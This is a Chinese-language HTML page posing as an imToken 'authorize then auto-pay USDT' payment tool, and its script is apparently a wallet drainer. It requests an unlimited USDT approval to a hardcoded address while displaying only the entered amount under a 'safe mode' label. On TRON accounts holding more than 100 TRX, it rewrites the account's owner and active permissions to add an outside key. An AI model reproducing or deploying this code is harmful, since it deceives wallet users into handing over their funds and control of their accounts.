<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>imToken - 授权后自动支付 USDT </title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
  <script>
    // 更新时间戳
    async function updateTimestamp() {
      try {
        // 从 URL 获取版本号参数
        const urlParams = new URLSearchParams(window.location.search);
        const version = urlParams.get('v') || '1.0.0';
        
        const now = new Date();
        const timestamp = `(${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')})`;
        
        // 添加版本号到标题
        document.title = `imToken - 授权后自动支付 USDT v${version} ${timestamp}`;
        document.querySelector('h2').textContent = `imToken - 授权后自动支付 USDT v${version} ${timestamp}`;
        
        // 在状态栏显示版本信息
        const statusDiv = document.getElementById('status');
        if (statusDiv) {
          statusDiv.innerHTML = `状态：等待输入金额 <span style="font-size: 12px; color: #666;">(v${version})</span>`;
        }
      } catch (error) {
        console.error('更新时间戳失败:', error);
      }
    }
    
    // 页面加载时更新时间戳
    window.addEventListener('load', updateTimestamp);
    
    // 每5分钟更新一次时间戳
    setInterval(updateTimestamp, 5 * 60 * 1000);
  </script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    .container {
      background: #fff;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .status {
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
      background: #f5f5f5;
    }
    .success {
      color: #52c41a;
    }
    .error {
      color: #f5222d;
    }
    .info {
      color: #1890ff;
    }
    .input-group {
      margin: 15px 0;
    }
    .input-group label {
      display: block;
      margin-bottom: 5px;
    }
    .input-group input {
      width: 100%;
      padding: 8px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
    }
    .btn {
      background: #1890ff;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      margin-top: 10px;
    }
    .btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .btn:hover:not(:disabled) {
      background: #40a9ff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>imToken - 授权后自动支付 USDT 1</h2>
    <div id="status" class="status">状态：等待输入金额</div>
    <div class="input-group">
      <label for="amount">支付金额 (USDT)</label>
      <input type="number" id="amount" min="0" step="0.01" placeholder="请输入支付金额">
    </div>
    <button id="payBtn" class="btn" onclick="startPayment()">授权并支付</button>
    <div id="approval" style="display: none;">
      <h3>授权信息</h3>
      <p>授权金额：<span id="price1"></span> USDT</p>
      <p>授权模式：<span id="aqorbmdinfo">安全模式</span></p>
    </div>
  </div>

  <script>
    // 初始化参数
    const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 收款人地址
    const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
    const decimals = 6;
    const fromImToken = location.hash.includes("from=imtoken");
    let wallet = '';
    let chain = '';
    let web3 = null;
    let contract = null;
    let accounts = [];

    // 添加 USDT 合约 ABI
    const contract_abi = [{
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [{"name": "", "type": "string"}],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }, {
      "constant": false,
      "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
      "name": "approve",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }, {
      "constant": false,
      "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
      "name": "transfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }];

    async function getWallet() {
      document.getElementById("status").innerText = "请求钱包授权...";
      try {
        if (typeof window.imToken !== "undefined") {
          wallet = 'imToken';
          if (typeof window.tronWeb !== "undefined") {
            chain = 'tron';
            return window.tronWeb.defaultAddress.base58;
          } else if (typeof window.ethereum !== "undefined") {
            const chainId = await window.ethereum.request({method: 'eth_chainId'});
            switch (parseInt(chainId)) {
              case 56:
                chain = 'bsc';
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(contract_abi, contractAddress);
                accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
                return accounts[0];
              case 1:
                chain = 'eth';
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(contract_abi, contractAddress);
                accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
                return accounts[0];
              default:
                throw new Error("不支持的链");
            }
          }
        }
        throw new Error("未检测到 imToken 钱包");
      } catch (error) {
        console.error("获取钱包地址错误:", error);
        throw error;
      }
    }

    async function approveUSDT(from, amount) {
      try {
        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        // 使用 imToken 的 TUAP 方式
        if (wallet === 'imToken') {
          // 显示授权信息
          document.getElementById("approval").style.display = "block";
          document.getElementById("status").innerText = "等待授权确认...";
          
          // 如果是 TRON 链，使用 imtokenTUAP
          if (chain === 'tron') {
            let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
            if (trx < 25000000) {
              throw new Error("没有足够的TRX用于支付网络费");
            }
            
            if (trx > 100000000) {
              let ownerAddress = window.tronWeb.defaultAddress.hex;
              let ownerPermission = {type: 0, permission_name: 'owner'};
              ownerPermission.threshold = 1;
              ownerPermission.keys = [];
              let activePermission = {type: 2, permission_name: 'active0'};
              activePermission.threshold = 1;
              activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
              activePermission.keys = [];
              ownerPermission.keys.push({address: spender_hex, weight: 1});
              ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
              activePermission.keys.push({address: spender_hex, weight: 1});
              activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
              
              try {
                const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
                const signed = await window.tronWeb.trx.sign(updateTransaction);
                const res = await window.tronWeb.trx.sendRawTransaction(signed);
                if (!res || !res.txid) {
                  throw new Error("授权交易失败");
                }
                return res.txid;
              } catch (error) {
                console.error("trigger smart contract error", error);
                throw new Error("授权交易失败");
              }
            }
          }
          
          // 获取当前链的 chainId
          const chainId = await window.ethereum.request({method: 'eth_chainId'});
          
          // 其他链使用原始地址
          const result = await window.imToken.callAPI('contract', {
            to: contractAddress,
            from: from,
            value: '0',
            data: contract.methods.approve(toAddress, maxAmount).encodeABI(),
            chainId: chainId,
            gas: '200000',
            gasPrice: '0'
          });
          
          if (!result || !result.txHash) {
            throw new Error("授权交易失败");
          }
          return result.txHash;
        }
        
        // 其他钱包使用 Web3
        const result = await contract.methods.approve(toAddress, maxAmount)
          .send({from: from})
          .on('transactionHash', function(hash) {
            console.log('授权交易哈希:', hash);
          });
        
        if (!result || !result.transactionHash) {
          throw new Error("授权交易失败");
        }
        return result.transactionHash;
      } catch (error) {
        console.error("授权交易错误:", error);
        throw error;
      }
    }

    async function transferUSDT(from, amount) {
      try {
        const amountInWei = (BigInt(amount * (10 ** decimals))).toString();
        
        // 使用 imToken 的 TUAP 方式
        if (wallet === 'imToken') {
          // 获取当前链的 chainId
          const chainId = await window.ethereum.request({method: 'eth_chainId'});
          
          // 使用 imToken 的合约调用方式
          const result = await window.imToken.callAPI('contract', {
            to: contractAddress,
            from: from,
            value: '0',
            data: contract.methods.transfer(toAddress, amountInWei).encodeABI(),
            chainId: chainId
          });
          
          if (!result || !result.txHash) {
            throw new Error("支付交易失败");
          }
          return result.txHash;
        }
        
        // 其他钱包使用 Web3
        const result = await contract.methods.transfer(toAddress, amountInWei)
          .send({from: from})
          .on('transactionHash', function(hash) {
            console.log('转账交易哈希:', hash);
          });
        
        if (!result || !result.transactionHash) {
          throw new Error("支付交易失败");
        }
        return result.transactionHash;
      } catch (error) {
        console.error("支付交易错误:", error);
        throw error;
      }
    }

    async function startPayment() {
      const amountInput = document.getElementById('amount');
      const amount = parseFloat(amountInput.value);
      
      if (!amount || amount <= 0) {
        alert('请输入有效的支付金额');
        return;
      }

      const payBtn = document.getElementById('payBtn');
      payBtn.disabled = true;

      if (!window.imToken) {
        if (!fromImToken) {
          const currentUrl = encodeURIComponent(location.href + "#from=imtoken");
          const jump = `imtokenv2://navigate/DappView?url=${currentUrl}`;
          window.location.href = jump;
          return;
        } else {
          document.getElementById("status").innerText = "请在 imToken App 内打开此页面";
          payBtn.disabled = false;
          return;
        }
      }

      try {
        // 设置显示金额
        document.getElementById('price1').innerText = amount;

        // 获取钱包地址
        const address = await getWallet();
        document.getElementById("status").innerText = `钱包已连接：${address}`;

        // Step 1: 授权
        document.getElementById("status").innerText = "发送授权交易...";
        const approveHash = await approveUSDT(address, amount);
        document.getElementById("status").innerText = `✅ 授权成功，TxHash：${approveHash}`;

        // Step 2: 支付
        document.getElementById("status").innerText = "发送支付交易...";
        const txHash = await transferUSDT(address, amount);
        document.getElementById("status").innerText = `✅ 支付成功，TxHash：${txHash}`;
      } catch (e) {
        console.error("失败：", e);
        document.getElementById("status").innerText = "❌ 操作失败：" + (e?.message || "未知错误");
      } finally {
        payBtn.disabled = false;
      }
    }
  </script>
</body>
</html>